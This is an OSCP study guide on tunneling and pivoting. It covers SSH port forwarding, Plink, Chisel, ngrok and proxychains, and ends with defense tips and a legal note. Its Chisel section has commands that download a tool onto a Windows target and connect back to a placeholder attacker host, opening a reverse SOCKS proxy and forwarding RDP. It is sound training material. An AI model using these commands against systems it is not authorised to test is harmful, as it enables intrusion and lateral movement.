# VPN and Tunneling

VPNs and tunneling techniques are essential for bypassing network restrictions and securely accessing remote networks. This guide covers common VPN and tunneling methods for the OSCP exam.

## 📋 Table of Contents
1. [SSH Tunneling](#ssh-tunneling)
2. [Plink (Windows SSH)](#plink-windows-ssh)
3. [Chisel](#chisel)
4. [Ngrok](#ngrok)
5. [Proxychains](#proxychains)
6. [Defense](#-defense)
7. [Practice](#-practice)

## SSH Tunneling

### Local Port Forwarding
Forward a remote service to a local port:
```bash
# Syntax
ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER

# Example: Forward remote MySQL (3306) to local port 3307
ssh -L 3307:localhost:3306 user@target.com
```

### Remote Port Forwarding
Expose a local service to a remote server:
```bash
# Syntax
ssh -R [REMOTE_IP:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER

# Example: Expose local port 80 to remote port 8080
ssh -R 8080:localhost:80 user@target.com
```

### Dynamic Port Forwarding (SOCKS Proxy)
```bash
# Start SOCKS proxy on local port 1080
ssh -D 1080 user@target.com

# Configure browser or tools to use SOCKS proxy at 127.0.0.1:1080
```

## Plink (Windows SSH)

### Installation
Download from: http://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

### Basic Usage
```powershell
# Connect to SSH server
plink.exe -ssh user@target.com -P 22

# Local port forwarding
plink.exe -ssh -L 3307:localhost:3306 user@target.com

# Remote port forwarding
plink.exe -ssh -R 8080:localhost:80 user@target.com

# With key authentication
plink.exe -ssh -i private_key.ppk user@target.com
```

## Chisel

### Installation
```bash
# Download from https://github.com/jpillora/chisel/releases
# On attacker machine (Linux)
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_1.7.7_linux_amd64

# On Windows target
iwr -Uri "https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz" -OutFile chisel.gz
# Extract the .gz file
```

### Reverse SOCKS Proxy
```bash
# On attacker machine (server)
./chisel server -p 8000 --reverse

# On target machine (client)
./chisel client ATTACKER_IP:8000 R:socks
```

### Port Forwarding
```bash
# Forward remote 3389 to local 3389
./chisel client ATTACKER_IP:8000 R:3389:localhost:3389
```

## Ngrok

### Installation
1. Sign up at https://ngrok.com/
2. Download and install
3. Authenticate with your authtoken

### Basic Usage
```bash
# Create HTTP tunnel to local port 80
ngrok http 80

# Create TCP tunnel to local port 22
ngrok tcp 22

# With custom subdomain
ngrok http -subdomain=myapp 80
```

## Proxychains

### Installation
```bash
# Kali Linux
sudo apt install proxychains

# Configuration file
sudo nano /etc/proxychains4.conf
```

### Configuration
Add your proxy to the end of the configuration file:
```
socks4 127.0.0.1 1080
# or
socks5 127.0.0.1 1080
```

### Usage
```bash
# Run nmap through proxy
proxychains nmap -sT -Pn -n TARGET_IP

# Run any command through proxy
proxychains curl ifconfig.me
```

## 🛡 Defense

### Detection
- Monitor for unusual outbound connections
- Review logs for suspicious SSH connections
- Use network monitoring tools

### Prevention
- Disable root login over SSH
- Use key-based authentication
- Implement network segmentation
- Use VPNs with strong encryption
- Monitor for unauthorized port forwarding

## 🛠 Tools

### Tunneling
- **SSH**: Built-in port forwarding
- **Chisel**: Fast TCP/UDP tunnel
- **Ngrok**: Secure tunnels to localhost
- **Plink**: Windows SSH client

### Proxy Tools
- **Proxychains**: Force any TCP connection through a proxy
- **3proxy**: Tiny proxy server
- **reGeorg**: Web-based proxy

## 📚 Resources
- [SSH Tunneling Explained](https://www.ssh.com/ssh/tunneling/example)
- [Chisel Documentation](https://github.com/jpillora/chisel)
- [Ngrok Documentation](https://ngrok.com/docs)
- [Proxychains Tutorial](https://www.kali.org/tutorials/proxychains/)

## 🎯 Practice
1. Set up an SSH tunnel to access a restricted service
2. Use Chisel to create a reverse SOCKS proxy
3. Expose a local web server using Ngrok
4. Use Proxychains to route tools through a proxy

## ⚠️ Legal Note
Only perform tunneling and port forwarding on systems you own or have explicit permission to test. Unauthorized use of these techniques may be illegal.
